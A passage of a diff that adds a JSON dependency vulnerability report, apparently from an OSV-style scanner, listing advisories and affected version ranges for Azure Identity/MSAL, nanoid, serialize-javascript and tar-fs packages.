+                    "1.0.0b4",
+                    "1.0.1",
+                    "1.1.0",
+                    "1.10.0",
+                    "1.10.0b1",
+                    "1.11.0",
+                    "1.11.0b1",
+                    "1.11.0b2",
+                    "1.11.0b3",
+                    "1.12.0",
+                    "1.12.0b1",
+                    "1.12.0b2",
+                    "1.13.0",
+                    "1.13.0b1",
+                    "1.13.0b2",
+                    "1.13.0b3",
+                    "1.13.0b4",
+                    "1.14.0",
+                    "1.14.0b1",
+                    "1.14.0b2",
+                    "1.14.1",
+                    "1.15.0",
+                    "1.15.0b1",
+                    "1.15.0b2",
+                    "1.16.0",
+                    "1.16.0b1",
+                    "1.16.0b2",
+                    "1.2.0",
+                    "1.3.0",
+                    "1.3.1",
+                    "1.4.0",
+                    "1.4.0b1",
+                    "1.4.0b2",
+                    "1.4.0b3",
+                    "1.4.0b4",
+                    "1.4.0b5",
+                    "1.4.0b6",
+                    "1.4.0b7",
+                    "1.4.1",
+                    "1.5.0",
+                    "1.5.0b1",
+                    "1.5.0b2",
+                    "1.6.0",
+                    "1.6.0b1",
+                    "1.6.0b2",
+                    "1.6.0b3",
+                    "1.6.1",
+                    "1.7.0",
+                    "1.7.0b1",
+                    "1.7.0b2",
+                    "1.7.0b3",
+                    "1.7.0b4",
+                    "1.7.1",
+                    "1.8.0",
+                    "1.8.0b1",
+                    "1.9.0",
+                    "1.9.0b1"
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@azure/identity",
+                    "purl": "pkg:npm/%40azure/identity"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "4.2.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  },
+                  "package": {
+                    "ecosystem": "Maven",
+                    "name": "com.azure:azure-identity",
+                    "purl": "pkg:maven/com.azure/azure-identity"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.12.2"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "1.0.0",
+                    "1.0.0-preview.1",
+                    "1.0.0-preview.2",
+                    "1.0.0-preview.3",
+                    "1.0.0-preview.4",
+                    "1.0.0-preview.5",
+                    "1.0.1",
+                    "1.0.2",
+                    "1.0.3",
+                    "1.0.4",
+                    "1.0.5",
+                    "1.0.6",
+                    "1.0.7",
+                    "1.0.8",
+                    "1.0.9",
+                    "1.1.0",
+                    "1.1.0-beta.1",
+                    "1.1.0-beta.2",
+                    "1.1.0-beta.3",
+                    "1.1.0-beta.4",
+                    "1.1.0-beta.5",
+                    "1.1.0-beta.6",
+                    "1.1.0-beta.7",
+                    "1.1.1",
+                    "1.1.2",
+                    "1.1.3",
+                    "1.10.0",
+                    "1.10.0-beta.1",
+                    "1.10.1",
+                    "1.10.2",
+                    "1.10.3",
+                    "1.10.4",
+                    "1.11.0",
+                    "1.11.0-beta.1",
+                    "1.11.0-beta.2",
+                    "1.11.1",
+                    "1.11.2",
+                    "1.11.3",
+                    "1.11.4",
+                    "1.12.0",
+                    "1.12.0-beta.1",
+                    "1.12.1",
+                    "1.2.0",
+                    "1.2.0-beta.1",
+                    "1.2.0-beta.2",
+                    "1.2.1",
+                    "1.2.2",
+                    "1.2.3",
+                    "1.2.4",
+                    "1.2.5",
+                    "1.3.0",
+                    "1.3.0-beta.1",
+                    "1.3.0-beta.2",
+                    "1.3.1",
+                    "1.3.2",
+                    "1.3.3",
+                    "1.3.4",
+                    "1.3.5",
+                    "1.3.6",
+                    "1.3.7",
+                    "1.4.0",
+                    "1.4.0-beta.1",
+                    "1.4.1",
+                    "1.4.2",
+                    "1.4.3",
+                    "1.4.4",
+                    "1.4.5",
+                    "1.4.6",
+                    "1.5.0",
+                    "1.5.0-beta.1",
+                    "1.5.0-beta.2",
+                    "1.5.1",
+                    "1.5.2",
+                    "1.5.3",
+                    "1.5.4",
+                    "1.5.5",
+                    "1.6.0",
+                    "1.6.0-beta.1",
+                    "1.6.1",
+                    "1.7.0",
+                    "1.7.0-beta.1",
+                    "1.7.0-beta.2",
+                    "1.7.1",
+                    "1.7.2",
+                    "1.7.3",
+                    "1.8.0",
+                    "1.8.0-beta.1",
+                    "1.8.1",
+                    "1.8.2",
+                    "1.8.3",
+                    "1.9.0",
+                    "1.9.0-beta.1",
+                    "1.9.0-beta.2",
+                    "1.9.0-beta.3",
+                    "1.9.1",
+                    "1.9.2"
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@azure/msal-node",
+                    "purl": "pkg:npm/%40azure/msal-node"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.7.0"
+                        },
+                        {
+                          "fixed": "2.9.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  },
+                  "package": {
+                    "ecosystem": "NuGet",
+                    "name": "Microsoft.Identity.Client",
+                    "purl": "pkg:nuget/Microsoft.Identity.Client"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.49.1"
+                        },
+                        {
+                          "fixed": "4.60.4"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "4.49.1",
+                    "4.50.0",
+                    "4.51.0",
+                    "4.52.0",
+                    "4.53.0",
+                    "4.54.0",
+                    "4.54.1",
+                    "4.55.0",
+                    "4.55.0-TestPackage",
+                    "4.56.0",
+                    "4.57.0",
+                    "4.58.0",
+                    "4.58.1",
+                    "4.59.0",
+                    "4.59.1",
+                    "4.60.0",
+                    "4.60.0-netonly",
+                    "4.60.1",
+                    "4.60.2",
+                    "4.60.3"
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  },
+                  "package": {
+                    "ecosystem": "Go",
+                    "name": "github.com/Azure/azure-sdk-for-go/sdk/azidentity",
+                    "purl": "pkg:golang/github.com/Azure/azure-sdk-for-go/sdk/azidentity"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.6.0-beta.4.0.20240610221955-50774cd97099"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  },
+                  "package": {
+                    "ecosystem": "Maven",
+                    "name": "com.microsoft.azure:msal4j",
+                    "purl": "pkg:maven/com.microsoft.azure/msal4j"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "1.14.4-beta"
+                        },
+                        {
+                          "fixed": "1.15.1"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "1.14.4-beta",
+                    "1.15.0"
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  },
+                  "package": {
+                    "ecosystem": "NuGet",
+                    "name": "Azure.Identity",
+                    "purl": "pkg:nuget/Azure.Identity"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.11.4"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "1.0.0",
+                    "1.1.0",
+                    "1.1.1",
+                    "1.10.0",
+                    "1.10.1",
+                    "1.10.2",
+                    "1.10.3",
+                    "1.10.4",
+                    "1.11.0",
+                    "1.11.1",
+                    "1.11.2",
+                    "1.11.3",
+                    "1.2.0",
+                    "1.2.1",
+                    "1.2.2",
+                    "1.2.3",
+                    "1.3.0",
+                    "1.4.0",
+                    "1.4.1",
+                    "1.5.0",
+                    "1.6.0",
+                    "1.6.1",
+                    "1.7.0",
+                    "1.8.0",
+                    "1.8.1",
+                    "1.8.2",
+                    "1.9.0"
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  },
+                  "package": {
+                    "ecosystem": "NuGet",
+                    "name": "Microsoft.Identity.Client",
+                    "purl": "pkg:nuget/Microsoft.Identity.Client"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.61.0"
+                        },
+                        {
+                          "fixed": "4.61.3"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "4.61.0",
+                    "4.61.1",
+                    "4.61.2"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2024-35255",
+                "GO-2024-2918"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-362"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-06-11T19:57:01Z",
+                "nvd_published_at": "2024-06-11T17:16:03Z",
+                "severity": "MODERATE"
+              },
+              "details": "Azure Identity Libraries and Microsoft Authentication Library Elevation of Privilege Vulnerability.",
+              "id": "GHSA-m5vv-6r4h-3vj9",
+              "modified": "2025-07-22T15:12:31.350751Z",
+              "published": "2024-06-11T18:30:50Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-35255"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/AzureAD/microsoft-authentication-library-for-dotnet/issues/4806#issuecomment-2178960340"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/Azure/azure-sdk-for-go/commit/50774cd9709905523136fb05e8c85a50e8984499"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/Azure/azure-sdk-for-java/commit/5bf020d6ea056de40e2738e3647a4e06f902c18d"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/Azure/azure-sdk-for-js/commit/c6aa75d312ae463e744163cedfd8fc480cc8d492"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/Azure/azure-sdk-for-net/commit/9279a4f38bf69b457cfb9b354f210e0a540a5c53"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/Azure/azure-sdk-for-python/commit/cb065acd7d0f957327dc4f02d1646d4e51a94178"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35255"
+                }
+              ],
+              "related": [
+                "CGA-22v2-fxwf-9fr6",
+                "CGA-239r-c5f9-fpfj",
+                "CGA-23qm-339g-q5rq",
+                "CGA-24w3-c8cq-57qw",
+                "CGA-2692-hcq7-xjm8",
+                "CGA-28v8-7f8r-m9ww",
+                "CGA-295j-75j3-84vw",
+                "CGA-2cm4-vpc6-pv3j",
+                "CGA-2jpc-9pc4-35x9",
+                "CGA-2p8f-mv2m-8p2g",
+                "CGA-2q47-7rqc-rvpr",
+                "CGA-2r8r-8pf9-93p6",
+                "CGA-2whj-v58w-p3cw",
+                "CGA-2x2c-6f9x-w8vp",
+                "CGA-2xfh-qmgq-vx5v",
+                "CGA-33cm-cxfp-hq9x",
+                "CGA-35qq-v4x7-g8hr",
+                "CGA-3gfh-xg79-64rx",
+                "CGA-3hgh-xw5g-q968",
+                "CGA-3mg9-gppp-p5xg",
+                "CGA-42mp-vp7j-m293",
+                "CGA-46jv-359v-37c2",
+                "CGA-48qh-3cmx-x3q7",
+                "CGA-4c8h-55mj-27g9",
+                "CGA-4cp8-v8x9-xf65",
+                "CGA-4g9m-vv8j-hw69",
+                "CGA-4gf6-v2x3-r55p",
+                "CGA-4hfg-7vmx-9jvw",
+                "CGA-4q6g-7c97-xpcc",
+                "CGA-4wjw-qhr2-p3mg",
+                "CGA-525c-q846-rphh",
+                "CGA-562h-vqjm-ghfg",
+                "CGA-56xw-wjg8-j46r",
+                "CGA-5c4f-crg6-6jx2",
+                "CGA-5f2c-7cjw-vfxg",
+                "CGA-5hj9-rjqf-qcxc",
+                "CGA-5ppx-hc8c-fq3g",
+                "CGA-5qxp-943m-6pf3",
+                "CGA-5rw9-rrmv-pmfr",
+                "CGA-5xwc-hffc-phx4",
+                "CGA-63vw-p545-47gm",
+                "CGA-67hg-88j4-hpq8",
+                "CGA-6ppc-7w2f-hw86",
+                "CGA-6w2h-93jf-xf67",
+                "CGA-6wqc-q5xf-q3mx",
+                "CGA-73qv-xhj6-j54c",
+                "CGA-7c7g-h9fv-q8j3",
+                "CGA-7f7r-5pp2-5g35",
+                "CGA-7g64-4rrc-2xmx",
+                "CGA-7mwf-x7vp-3hh2",
+                "CGA-7qrr-xjp6-fjxm",
+                "CGA-7w94-v262-g4jv",
+                "CGA-82x3-3574-2q9q",
+                "CGA-84mf-6w7v-xpm3",
+                "CGA-87rr-22r2-g8x6",
+                "CGA-8mj5-qc52-76qf",
+                "CGA-8qw6-v3xw-qphj",
+                "CGA-8x4m-9598-h9g4",
+                "CGA-8xqf-2j7q-9gjw",
+                "CGA-925c-qrgr-37xp",
+                "CGA-94wr-fc7q-9496",
+                "CGA-96hr-8566-xc9j",
+                "CGA-98x5-2cwf-6r85",
+                "CGA-9932-7qxv-xj4w",
+                "CGA-99j2-2p96-3v6m",
+                "CGA-9mpm-96vr-8v53",
+                "CGA-9q5x-f9q6-j52q",
+                "CGA-9qh2-h2gh-qp89",
+                "CGA-9qwr-q2wh-qfvf",
+                "CGA-9x78-w7v8-whxf",
+                "CGA-c7cv-4x3g-mg7h",
+                "CGA-c8q8-c29m-7vmq",
+                "CGA-f2q2-cx8f-c86p",
+                "CGA-f42v-9vqh-cg28",
+                "CGA-f697-72xm-6h8m",
+                "CGA-f7gg-hgq4-hpf4",
+                "CGA-f87j-mwwr-p28x",
+                "CGA-fcv3-88m9-wp7j",
+                "CGA-ff6m-2686-9x3m",
+                "CGA-frrf-2vc3-mfr3",
+                "CGA-g7v9-vhpv-q43g",
+                "CGA-g9xv-mrf3-2jx9",
+                "CGA-h77w-v467-3cxg",
+                "CGA-h92v-4jxh-fr55",
+                "CGA-h96h-jwq9-2843",
+                "CGA-h97j-j3cx-2f23",
+                "CGA-hfq8-fhqg-qhqx",
+                "CGA-hjwx-8794-hj5w",
+                "CGA-hmfp-mpjh-cq5p",
+                "CGA-hqvj-7964-g4jg",
+                "CGA-hvcv-mvpr-vc77",
+                "CGA-j3pv-xcfg-x4gc",
+                "CGA-jq77-vh5j-x3gh",
+                "CGA-m5m3-54c5-23rr",
+                "CGA-mc8m-44p5-273h",
+                "CGA-mf3v-prm8-j3gq",
+                "CGA-mg58-x2gv-pr6r",
+                "CGA-mhr5-mm59-g9v8",
+                "CGA-mpvw-q85f-chh9",
+                "CGA-mwp3-p76c-m3qq",
+                "CGA-p3rr-28v2-97cv",
+                "CGA-p3w2-7jg8-hqrq",
+                "CGA-p5hj-4w5m-gvwp",
+                "CGA-p95p-m854-8783",
+                "CGA-p9mr-h84j-x2p6",
+                "CGA-pgfm-3gq9-vjmg",
+                "CGA-pvqw-fpfq-xh69",
+                "CGA-q5w3-f5vm-g9m3",
+                "CGA-q643-mc95-9f4f",
+                "CGA-q662-93cq-rqr3",
+                "CGA-q6c6-rcxj-5fmh",
+                "CGA-q97p-h56j-m4fv",
+                "CGA-qv5p-9m82-733m",
+                "CGA-r82q-hw76-gmrc",
+                "CGA-r84x-fv23-6q9m",
+                "CGA-rgv3-wg25-j59v",
+                "CGA-rm3q-73jc-4q9m",
+                "CGA-rq8w-587r-f9pm",
+                "CGA-rqxq-m4c2-x9ph",
+                "CGA-v3cj-jgcv-jmhw",
+                "CGA-v6vj-gm26-7r8p",
+                "CGA-vfm9-cgcj-prvp",
+                "CGA-vhj2-vrq8-mm67",
+                "CGA-vw5v-7qhc-9gg5",
+                "CGA-vw6g-89v3-x8pv",
+                "CGA-w34q-7mx6-527r",
+                "CGA-w6v8-wcmv-cfjx",
+                "CGA-wcmr-gjcv-ccpm",
+                "CGA-wqxh-m97h-j5f6",
+                "CGA-wwww-fc3r-f74g",
+                "CGA-wx3h-6vhc-mqpv",
+                "CGA-x3fq-g96j-xmjq",
+                "CGA-x6c3-p37f-phhf",
+                "CGA-x8q8-gpj4-r44c",
+                "CGA-xcg6-jg76-p7wq",
+                "CGA-xcmv-3hxx-7m2v",
+                "CGA-xj36-3hv3-chh7",
+                "CGA-xj6j-5vv8-pjv3",
+                "CGA-xvjv-2jwr-6897",
+                "CGA-xvp5-g73c-c5j4"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+                  "type": "CVSS_V3"
+                },
+                {
+                  "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "Azure Identity Libraries and Microsoft Authentication Library Elevation of Privilege Vulnerability"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "nanoid",
+            "version": "3.3.1",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-mwcw-c2x4-8c55"
+              ],
+              "aliases": [
+                "CVE-2024-55565",
+                "GHSA-mwcw-c2x4-8c55"
+              ],
+              "max_severity": "4.3"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/12/GHSA-mwcw-c2x4-8c55/GHSA-mwcw-c2x4-8c55.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "nanoid",
+                    "purl": "pkg:npm/nanoid"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "5.0.9"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/12/GHSA-mwcw-c2x4-8c55/GHSA-mwcw-c2x4-8c55.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "nanoid",
+                    "purl": "pkg:npm/nanoid"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.3.8"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2024-55565"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-835"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-12-09T22:42:43Z",
+                "nvd_published_at": "2024-12-09T02:15:19Z",
+                "severity": "MODERATE"
+              },
+              "details": "When nanoid is called with a fractional value, there were a number of undesirable effects:\n\n1. in browser and non-secure, the code infinite loops on while (size--)\n2. in node, the value of poolOffset becomes fractional, causing calls to nanoid to return zeroes until the pool is next filled\n3. if the first call in node is a fractional argument, the initial buffer allocation fails with an error\n\nVersion 3.3.8 and 5.0.9 are fixed.",
+              "id": "GHSA-mwcw-c2x4-8c55",
+              "modified": "2025-11-04T16:54:54Z",
+              "published": "2024-12-09T03:30:59Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-55565"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ai/nanoid/pull/510"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/ai/nanoid"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ai/nanoid/compare/3.3.7...3.3.8"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ai/nanoid/releases/tag/5.0.9"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.debian.org/debian-lts-announce/2024/12/msg00025.html"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.debian.org/debian-lts-announce/2025/01/msg00006.html"
+                }
+              ],
+              "related": [
+                "CGA-7vvh-vj96-x4xv",
+                "CGA-8vh7-wwpf-5f4g",
+                "CGA-cr3m-qfmj-rhf8",
+                "CGA-q99g-63m8-c4r8"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Predictable results in nanoid generation when given non-integer values"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "serialize-javascript",
+            "version": "6.0.0",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-76p7-773f-r4q5"
+              ],
+              "aliases": [
+                "CVE-2024-11831",
+                "GHSA-76p7-773f-r4q5"
+              ],
+              "max_severity": "5.4"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/02/GHSA-76p7-773f-r4q5/GHSA-76p7-773f-r4q5.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "serialize-javascript",
+                    "purl": "pkg:npm/serialize-javascript"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "6.0.0"
+                        },
+                        {
+                          "fixed": "6.0.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2024-11831"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-79"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-02-10T21:19:59Z",
+                "nvd_published_at": "2025-02-10T16:15:37Z",
+                "severity": "MODERATE"
+              },
+              "details": "A flaw was found in npm-serialize-javascript. The vulnerability occurs because the serialize-javascript module does not properly sanitize certain inputs, such as regex or other JavaScript object types, allowing an attacker to inject malicious code. This code could be executed when deserialized by a web browser, causing Cross-site scripting (XSS) attacks. This issue is critical in environments where serialized data is sent to web clients, potentially compromising the security of the website or web application using this package.",
+              "id": "GHSA-76p7-773f-r4q5",
+              "modified": "2025-11-28T21:46:28.307741Z",
+              "published": "2025-02-10T18:30:47Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-11831"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/yahoo/serialize-javascript/pull/173"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/yahoo/serialize-javascript/commit/f27d65d3de42affe2aac14607066c293891cec4e"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/yahoo/serialize-javascript/commit/7f3ac252d86b802454cb43782820aea2e0f6dc25"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/yahoo/serialize-javascript"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2312579"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/security/cve/CVE-2024-11831"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:9294"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:8551"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:8544"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:8512"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:8479"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:8233"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:8078"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:8059"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:4511"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:3870"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:21203"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:21068"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:1468"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:1334"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:10853"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHSA-2025:0381"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://access.redhat.com/errata/RHBA-2025:0304"
+                }
+              ],
+              "related": [
+                "CGA-72hf-gjp2-m4hx"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Cross-site Scripting (XSS) in serialize-javascript"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "tar-fs",
+            "version": "2.1.1",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-8cj5-5rvv-wf4v"
+              ],
+              "aliases": [
+                "CVE-2025-48387",
+                "GHSA-8cj5-5rvv-wf4v"
+              ],
+              "max_severity": "8.7"
+            },
+            {
+              "ids": [
+                "GHSA-pq67-2wwv-3xjx"
+              ],
+              "aliases": [
+                "CVE-2024-12905",
+                "GHSA-pq67-2wwv-3xjx"
+              ],
+              "max_severity": "7.5"
+            },
+            {
+              "ids": [
+                "GHSA-vj76-c3g6-qr5v"
+              ],
+              "aliases": [
+                "CVE-2025-59343",
+                "GHSA-vj76-c3g6-qr5v"
+              ],
+              "max_severity": "8.7"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-8cj5-5rvv-wf4v/GHSA-8cj5-5rvv-wf4v.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.16.5"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-8cj5-5rvv-wf4v/GHSA-8cj5-5rvv-wf4v.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.0.0"
+                        },
+                        {
+                          "fixed": "2.1.3"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-8cj5-5rvv-wf4v/GHSA-8cj5-5rvv-wf4v.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.0.0"
+                        },
+                        {
+                          "fixed": "3.0.9"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-48387"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-22"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-06-03T06:14:25Z",
+                "nvd_published_at": "2025-06-02T20:15:22Z",
+                "severity": "HIGH"
+              },
+              "details": "### Impact\n v3.0.8, v2.1.2, v1.16.4 and below\n\n### Patches\nHas been patched in 3.0.9, 2.1.3, and 1.16.5\n\n### Workarounds\nYou can use the ignore option to ignore non files/directories.\n\n```js\n  ignore (_, header) {\n    // pass files \u0026 directories, ignore e.g. symlinks\n    return header.type !== 'file' \u0026\u0026 header.type !== 'directory'\n  }\n```\n\n### Credit\nThank you Caleb Brown from Google Open Source Security Team for reporting this in detail.",
+              "id": "GHSA-8cj5-5rvv-wf4v",
